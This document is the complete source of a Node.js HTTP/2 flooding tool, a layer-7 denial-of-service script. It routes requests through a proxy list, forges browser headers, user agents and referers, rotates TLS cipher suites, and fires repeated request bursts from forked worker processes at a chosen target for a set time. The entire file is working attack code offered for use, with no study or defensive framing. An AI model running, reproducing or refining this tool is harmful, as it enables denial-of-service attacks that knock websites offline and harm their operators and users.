const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const fakeUA = require('fake-useragent');
 const { HeaderGenerator } = require('header-generator');
 tls.DEFAULT_ECDH_CURVE;

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });
  
try {
  var uas = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
  if (err.code !== 'ENOENT') throw err;
  console.log('UA LIST NOT FOUND [ua.txt]');
  process.exit();
};

 if (process.argv.length < 7){console.log(`Usage: node tls-public.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }
 
 const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
 const spoofed = ip_spoof();
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 80, maxVersion: 107, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders();
 const sig = [
    "ecdsa_secp256r1_sha256", 
    "ecdsa_secp384r1_sha384", 
    "ecdsa_secp521r1_sha512", 
    "rsa_pss_rsae_sha256", 
    "rsa_pss_rsae_sha384", 
    "rsa_pss_rsae_sha512", 
    "rsa_pkcs1_sha256", 
    "rsa_pkcs1_sha384", 
    "rsa_pkcs1_sha512"
 ];
 const cplist = [
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
 ]; 
 const lang_header = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", 
     "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", 
     "en-US,en;q=0.5", "en-US,en;q=0.9", 
     "de-CH;q=0.7", 
     "da, en-gb;q=0.8, en;q=0.7", 
     "cs;q=0.5"
 ];
 const encoding_header = [
     "deflate, gzip, br", 
     "gzip", "deflate", 
     "br"
 ];
 const control_header = [
     "no-cache", 
     "max-age=0"
 ];
 const refers = [
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://coccoc.com/search#query=",
     "http://ddosvn.somee.com/f5.php?v=",
     "http://engadget.search.aol.com/search?q=",
     "http://engadget.search.aol.com/search?q=query?=query=&q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://filehippo.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
     "http://go.mail.ru/search?mail.ru=1&q=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://host-tracker.com/check_page/?furl=",
     "http://itch.io/search?q=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://jobs.bloomberg.com/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://louis-ddosvn.rhcloud.com/f5.html?v=",
     "http://millercenter.org/search?q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
     "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
     "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
     "http://search.aol.com/aol/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://vk.com/profile.php?redirect=",
     "http://www.ask.com/web?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "http://www.bing.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.google.com/?q=",
     "http://www.google.com/translate?u=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
     "http://www.pagescoring.com/website-speed-test/?url=",
     "http://www.reddit.com/search?q=",
     "http://www.search.com/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://www.ted.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://www.usatoday.com/search/results?q=",
     "http://www.ustream.tv/search?q=",
     "http://yandex.ru/yandsearch?text=",
     "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
     "http://ytmnd.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://careers.carolinashealthcare.org/search?q=",
     "https://check-host.net/",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "https://drive.google.com/viewerng/viewer?url=",
     "https://duckduckgo.com/?q=",
     "https://google.com/",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
     "https://help.baidu.com/searchResult?keywords=",
     "https://play.google.com/store/search?q=",
     "https://pornhub.com/",
     "https://r.search.yahoo.com/",
     "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
     "https://steamcommunity.com/market/search?q=",
     "https://vk.com/profile.php?redirect=",
     "https://www.bing.com/search?q=",
     "https://www.cia.gov/index.html",
     "https://www.facebook.com/",
     "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
     "https://www.google.ad/search?q=",
     "https://www.google.ae/search?q=",
     "https://www.google.al/search?q=",
     "https://www.google.co.ao/search?q=",
     "https://www.google.com.af/search?q=",
     "https://www.google.com.ag/search?q=",
     "https://www.google.com.ai/search?q=",
     "https://www.google.com/search?q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
     "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
     "https://www.npmjs.com/search?q=",
     "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
     "https://www.pinterest.com/search/?q=",
     "https://www.qwant.com/search?q=",
     "https://www.ted.com/search?q=",
     "https://www.usatoday.com/search/results?q=",
     "https://www.yandex.com/yandsearch?text=",
     "https://www.youtube.com/",
     "https://yandex.ru/"
 ];
 const querys = [
     "", 
     "&", 
     "", 
     "&&", 
     "and", 
     "=", 
     "+", 
     "?"
 ];
 const pathts = [
     "?s=", 
     "/?", 
     "?q=", 
     "?true=", 
     "?"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var queryz = querys[Math.floor(Math.random() * querys.length)];
 var pathts1 = pathts[Math.floor(Math.random() * pathts.length)]
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path + pathts1 + randstr(15) + queryz + randstr(15);
 headers["origin"] = parsedTarget.host;
 headers[":scheme"] = "https";
 headers["accept"] = randomHeaders['accept'];
 headers["accept-language"] = randomHeaders['accept-language'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["cache-control"] = "no-cache";
 headers["upgrade-insecure-requests"] = "1";
 headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
 headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
 headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
 headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
 headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
 headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
 headers["sec-fetch-user"] = randomHeaders['sec-fetch-user'];
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["pragma"] =  "no-cache";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = uas[Math.floor(Math.random() * uas.length)];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 10,
            maxRedirects: 5,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: cipper,
            secureProtocol: ["TLSv1_3_method"],
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            servername: parsedTarget.host,
            sessionTimeout: 5000
            
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 10 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);